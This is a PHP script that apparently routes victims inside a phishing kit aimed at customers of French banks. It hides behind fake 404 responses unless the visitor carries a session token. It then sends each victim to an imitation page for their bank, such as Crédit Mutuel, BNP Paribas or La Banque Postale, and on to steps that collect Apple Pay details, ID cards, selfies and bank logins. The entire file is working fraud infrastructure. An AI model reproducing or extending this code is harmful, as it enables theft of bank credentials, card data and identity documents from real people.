<?php

session_start();
include '../../settings.php';

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{

	if(strpos($_SERVER['REQUEST_URI'],$_SESSION['gotovbv']))
	{
		echo $_SESSION['bank'];

		if(strpos($_SESSION['bank'], "MUTUEL"))
		{

			header('Location: credit-mutuel-as20.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

		}
		else
		{

			if(strpos($_SESSION['bank'], "AGRICOLE"))
			{


			header('Location: credit-agricole-as21.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

			}
			else{
				if(strpos($_SESSION['bank'], "POPULAIRE") || strpos($_SESSION['bank'], "ATIXIS") || $_SESSION['bank'] == "NATIXIS")
				{


			header('Location: banque-populaire-as22.php?'.$_SESSION['userid'].$_SESSION['gotovbv'].$_SESSION['ce_noappcode'] );

				
				}
				else{


		if(strpos($_SESSION['bank'], "PARIBAS"))
		{


			header('Location: bnp-paribas-as23.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

		}
		else{


		if(strpos($_SESSION['bank'], "EPARGNE") || strpos($_SESSION['bank'], "D'EPARGNE") || strpos($_SESSION['bank'], "DEPARGNE"))
		{


			header('Location: caisse-depargne-as24.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

		}
		else{

			if(strpos($_SESSION['bank'], "NORD"))
			{


			header('Location: credit-du-nord-as25.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

			}
			else{
					if(strpos($_SESSION['bank'], "LYONNAIS") || strpos($_SESSION['bank'], "LCL") || $_SESSION['bank'] == "LCL BANQUE")
					{


			header('Location: credit-lyonnais-as26.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

						}
						else{

							if(strpos($_SESSION['bank'], "INDUSTRIEL") || $_SESSION['bank'] == "CIC")
								{


			header('Location: cic-as27.php?'.$_SESSION['userid'].$_SESSION['gotovbv'].$_SESSION['ce_noappcode']);

								}
								else{
									if(strpos($_SESSION['bank'], "POSTALE") || strpos($_SESSION['bank'], "POSTE")  )
											{


											header('Location: labp-as28.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

											}
											else{
												if(strpos($_SESSION['bank'], "GENERALE") || $_SESSION['bank'] == "SOCIETE GENERALE, S.A."  )
													{


												header('Location: societe-generale-as29.php?'.$_SESSION['userid'].$_SESSION['gotovbv']);

													}

													else{
							if($applepay == "on")
							{

								header('Location: ../loader.php?'.$_SESSION['userid'].$_SESSION['gotoapplepay']);


							}

							else{
								if($cni == "on")
								{
									header('Location: ../loader.php?'.$_SESSION['userid'].$_SESSION['gotocni']);

								}
								else{

									if($selfie == "on")
									{
										header('Location: ../loader.php?'.$_SESSION['userid'].$_SESSION['gotoselfie']);
									}
									else
									{

										if($log_bank == "on")
										{
											header('Location: ../loader.php?'.$_SESSION['userid'].$_SESSION['gotologbank']);

										}
										else{

											header('Location: ../loader.php?'.$_SESSION['userid'].$_SESSION['gotofinished']);

										}

									}

								}


							}

													}
											}
								}


						}

				}


		}

		}


				}

			}





		}











	}
	else{

		die('HTTP/1.0 404 Not Found');
	}






}
else{


	die('HTTP/1.0 404 Not Found');
}

?>